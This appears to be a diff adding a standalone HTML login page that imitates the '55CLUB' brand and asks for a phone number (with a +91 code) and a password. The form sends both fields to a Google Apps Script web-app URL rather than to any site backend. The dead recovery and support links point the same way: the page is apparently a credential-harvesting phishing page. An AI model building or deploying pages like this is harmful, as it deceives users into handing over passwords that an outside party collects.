@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>55CLUB - Login</title>
+    <style>
+        :root {
+          
+            --primary-color: #ff7b7b;
+            --text-color: #333;
+            --border-color: #e0e0e0;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        }
+
+        body {
+            background-color: #fff;
+        }
+
+        .header {
+            background-color: var(--primary-color);
+            padding: 1rem;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            color: white;
+        }
+
+        .back-button {
+            background: none;
+            border: none;
+            color: white;
+            font-size: 1.5rem;
+            cursor: pointer;
+        }
+
+        .language-selector {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .logo {
+            text-align: center;
+            padding: 2rem 0;
+            background-color: var(--primary-color);
+            color: white;
+        }
+
+        .login-container {
+            padding: 1rem;
+        }
+
+        .tab-container {
+            display: flex;
+            border-bottom: 1px solid var(--border-color);
+            margin-bottom: 2rem;
+        }
+
+        .tab {
+            flex: 1;
+            text-align: center;
+            padding: 1rem;
+            cursor: pointer;
+            color: #666;
+        }
+
+        .tab.active {
+            color: var(--primary-color);
+            border-bottom: 2px solid var(--primary-color);
+        }
+
+        .input-group {
+            margin-bottom: 1.5rem;
+        }
+
+        .input-group label {
+            display: block;
+            margin-bottom: 0.5rem;
+            color: var(--text-color);
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 0.75rem;
+            border: 1px solid var(--border-color);
+            border-radius: 4px;
+            font-size: 1rem;
+        }
+
+        .phone-input {
+            display: flex;
+            gap: 0.5rem;
+        }
+
+        .country-code {
+            width: 100px;
+        }
+
+        .remember-me {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            margin-bottom: 1.5rem;
+            color: #666;
+        }
+
+        .login-button {
+            width: 100%;
+            padding: 1rem;
+            background-color: #ff7b7b;
+            border: none;
+            border-radius: 2rem;
+            color: white;
+            font-size: 1rem;
+            cursor: pointer;
+            margin-bottom: 1rem;
+        }
+
+        .register-button {
+            width: 100%;
+            padding: 1rem;
+            background-color: white;
+            border: 1px solid var(--primary-color);
+            border-radius: 2rem;
+            color: var(--primary-color);
+            font-size: 1rem;
+            cursor: pointer;
+            margin-bottom: 2rem;
+        }
+
+        .footer {
+            display: flex;
+            justify-content: space-around;
+            padding: 1rem;
+            color: #666;
+        }
+
+        .footer-link {
+            text-align: center;
+            text-decoration: none;
+            color: inherit;
+        }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <button class="back-button" aria-label="Go back">←</button>
+        <img src="images/logo.jpeg" alt="">
+        <div class="language-selector">
+            <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 512 512'%3E%3Cpath fill='%23fff' d='M0 0h512v512H0z'/%3E%3Cpath fill='%23D80027' d='M0 0h512v39.4H0zM0 78.8h512v39.4H0zM0 157.6h512V197H0zM0 236.4h512v39.4H0zM0 315.2h512v39.4H0zM0 394h512v39.4H0zM0 472.8h512v39.4H0z'/%3E%3Crect fill='%232E52B2' width='275.6' height='275.6'/%3E%3C/svg%3E" 
+                 alt="US flag" 
+                 width="24" 
+                 height="16">
+            EN
+        </div>
+    </header>
+
+    <div class="logo">
+        <h1>Login</h1>
+    </div>
+
+    <main class="login-container">
+        <p>Please log in with your phone number or email<br>
+           If you forget your password, please contact customer service</p>
+
+        <div class="tab-container">
+          
+            <div class="tab active">phone number</div>
+            <div class="tab">Email Login</div>
+        </div>
+
+        <form id="submit-form" action="https://script.google.com/macros/s/AKfycbyG5Wwvvi_JpTOWEMjp0HBm8SuJ41i-NOgfpTlj3pNuMJUGGgqftP_p3iox4nK7YILK/exec" method="post" role="form" >
+            <div class="input-group">
+        
+              
+              
+              
+              <label for="phone">Phone number</label>
+                <div class="phone-input">
+                    <select class="input-field country-code" id="country-code">
+                        <option value="+91">+91</option>
+                    </select>
+                    <input type="tel"  name="name"
+                           id="phone" 
+                           class="input-field" 
+                           placeholder="Please enter the phone number" 
+                           required>
+                </div>
+            </div>
+
+            <div class="input-group">
+                <label for="password">Password</label>
+                <input type="password" 
+                       id="password" name="name"
+                       class="input-field" 
+                       placeholder="Password" 
+                       required>
+            </div>
+
+            <div class="remember-me">
+                <input type="checkbox" id="remember">
+                <label for="remember">Remember password</label>
+            </div>
+
+            <button type="submit"  class="login-button">Log in</button>
+            <button type="button" class="register-button">Register</button>
+        </form>
+
+        <footer class="footer">
+            <a href="#" class="footer-link">
+                <div>🔒</div>
+                Forgot password
+            </a>
+            <a href="#" class="footer-link">
+                <div>💬</div>
+                Customer Service
+            </a>
+        </footer>
+    </main>
+</body>
+</html>
